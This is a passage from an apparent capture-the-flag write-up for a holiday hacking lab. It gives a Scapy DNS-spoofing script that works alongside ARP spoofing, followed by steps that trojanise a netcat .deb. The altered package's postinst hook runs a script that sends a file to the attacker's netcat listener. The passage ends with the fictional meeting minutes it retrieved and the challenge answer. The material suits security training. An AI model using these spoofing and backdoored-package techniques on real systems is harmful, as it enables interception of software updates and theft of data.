Our Mac Addr macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) # destination ip we arp spoofed #ipaddr_we_arp_spoofed = \"10.6.1.10\" ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = packet [ Ether ] . dst , dst = packet [ Ether ] . src ) # need to replace mac addresses ip = IP ( dst = packet [ IP ] . src , src = packet [ IP ] . dst ) # need to replace IP addresses udp = UDP ( dport = packet [ UDP ] . sport , sport = packet [ UDP ] . dport ) # need to replace ports dns = DNS ( id = packet [ DNS ] . id , qr = 1 , ancount = 1 , qd = packet [ DNS ] . qd , an = DNSRR ( rrname = packet [ DNS ] . qd . qname , ttl = 10 , rdata = ipaddr ) # MISSING DNS RESPONSE LAYER VALUES ) dns_response = eth / ip / udp / dns print ( packet . show ()) print ( dns_response . show ()) sendp ( dns_response , iface = \"eth0\" ) def main (): berkeley_packet_filter = \" and \" . join ( [ \"udp dst port 53\" , # dns \"udp[10] & 0x80 = 0\" , # dns request \"dst host {} \" . format ( ipaddr_we_arp_spoofed ), # destination ip we had spoofed (not our real ip) \"ether dst host {} \" . format ( macaddr ) # our macaddress since we spoofed the ip to our mac ]) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff ( filter = berkeley_packet_filter , prn = handle_dns_request , store = 0 , iface = \"eth0\" , count = 1 ) if __name__ == \"__main__\" : value = True while ( value ): main () First, I used 4 windows to do this. /usr/bin/tmux split-window -hb chmod +x dns.py chmod +x arp.py nohup ./dns.py & nohup ./arp.py & Now, move to a new TMUX window and launch the webserver. mkdir -p www/pub/jfrost/backdoor cd www python3 -m http.server 80 Next, start up a Netcat listener to save to a file. ctrl+b+o nc -l -p 1234 > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt Lastly, build the .deb from the netcat and copy it to the properly location for the webserver call to pick it up ctrl+b+o mkdir build cd build cp ../debs/ cp ../debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb ./ dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work mkdir work/DEBIAN ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb tar -xvf control.tar.xz ./control tar -xvf control.tar.xz ./postinst cp control work/DEBIAN/ cp postinst work/DEBIAN/ IP = $( /sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1 ) HACK = '#!/bin/bash\\nnc -w 3 ' $IP ' 1234 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' echo -e \" $HACK \" > hack.sh cp hack.sh ./work/usr/ chmod +x ./work/usr/hack.sh cp postinst work/DEBIAN/ echo \"sudo chmod 2755 /usr/hack.sh && /usr/hack.sh &\" >> work/DEBIAN/postinst dpkg-deb --build ./work cp work.deb ../www/pub/jfrost/backdoor/suriv_amd64.deb Eventually, this returned the proper file, whose contents are below. (click to open) NORTH_POLE_Land_Use_Board_Meeting_Minuntes NORTH POLE LAND USE BOARD MEETING MINUTES January 20, 2020 Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time. Roll call of Board members please: Chairman Jack Frost - Present Vice Chairman Mother Nature - Present Superman - Present Clarice - Present Yukon Cornelius - HERE! Ginger Breaddie - Present King Moonracer - Present Mrs. Donner - Present Tanta Kringle - Present Charlie In-the-Box - Here Krampus - Growl Dolly - Present Snow Miser - Heya! Alabaster Snowball - Hello Queen of the Winter Spirits - Present ALSO PRESENT: Kris Kringle Pepper Minstix Heat Miser Father Time Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting. Review minutes for December 2020 meeting. Motion to accept \u2013 Mrs. Donner. Second \u2013 Superman. Minutes approved. OLD BUSINESS: No Old Business. RESOLUTIONS: The board took up final discussions of the plans presented last year for the expansion of Santa\u2019s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle. Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, \u201cThese changes will put a heavy toll on the infrastructure of the North Pole.\u201d Mr. Krampus replied, \u201cThe infrastructure has already been expanded to handle it quite easily.\u201d Chairman Frost then noted, \u201cBut the additional traffic will be a burden on local residents.\u201d Dolly explained traffic projections were all in alignment with existing roadways. Chairman Frost then exclaimed, \u201cBut with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as \u2018The Frostiest Place on Earth?\u2019\u201d Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board. Mrs. Nature made a motion to approve. Seconded by Mr. Cornelius. Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life. Approved: Mother Nature Superman Clarice Yukon Cornelius Ginger Breaddie King Moonracer Mrs. Donner Charlie In the Box Krampus Dolly Snow Miser Alabaster Snowball Queen of the Winter Spirits Opposed: Jack Frost Resolution carries. Construction approved. NEW BUSINESS: Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc. Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time\u2019s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000 BTUs, a figure she considers \u201cincredibly high for a building that size, likely two orders of magnitude too high. Why, it might burn the whole North Pole down!\u201d Mr. H. Miser replied with a laugh, \u201cThat\u2019s the whole point!\u201d The board voted unanimously to reject the initial proposal, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time\u2019s castle heating system. Motion to adjourn \u2013 So moved, Krampus. Second \u2013 Clarice. All in favor \u2013 aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan. Meeting adjourned. (END) Success Answer = \"Tanta Kringle\" recused herself Noel Boetie Yay! You found the flaw! We'll work on fixing it.","title":"How to run the commands"}]}